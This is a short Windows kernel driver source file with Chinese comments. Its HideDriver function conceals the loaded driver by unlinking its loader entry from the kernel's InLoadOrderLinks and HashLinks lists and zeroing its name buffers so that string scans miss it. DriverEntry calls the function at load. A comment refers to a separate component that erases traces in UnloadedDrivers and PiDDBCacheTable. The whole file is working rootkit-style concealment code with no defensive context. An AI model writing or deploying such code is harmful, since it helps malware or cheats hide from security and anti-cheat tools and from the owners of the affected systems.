VOID HideDriver(PDRIVER_OBJECT DriverObject)
{
    PKLDR_DATA_TABLE_ENTRY entry =
        (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    // 1. 从 InLoadOrderLinks 摘链
    PLIST_ENTRY prev = entry->InLoadOrderLinks.Blink;
    PLIST_ENTRY next = entry->InLoadOrderLinks.Flink;
    prev->Flink = next;
    next->Blink = prev;

    // 2. 摘 HashLinks（部分枚举走这条链）
    if (entry->HashLinks.Flink && entry->HashLinks.Blink) {
        PLIST_ENTRY hp = entry->HashLinks.Blink;
        PLIST_ENTRY hn = entry->HashLinks.Flink;
        hp->Flink = hn;
        hn->Blink = hp;
    }

    // 3. 清名字，避免字符串扫描命中
    if (entry->BaseDllName.Buffer) {
        RtlZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
        entry->BaseDllName.Length = 0;
        entry->BaseDllName.MaximumLength = 0;
    }
    if (entry->FullDllName.Buffer) {
        RtlZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
        entry->FullDllName.Length = 0;
        entry->FullDllName.MaximumLength = 0;
    }

    // 4. 摘 UnloadedDrivers / PiDDBCacheTable 由 protect 角色另外处理
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    HideDriver(DriverObject);
    return STATUS_SUCCESS;
}
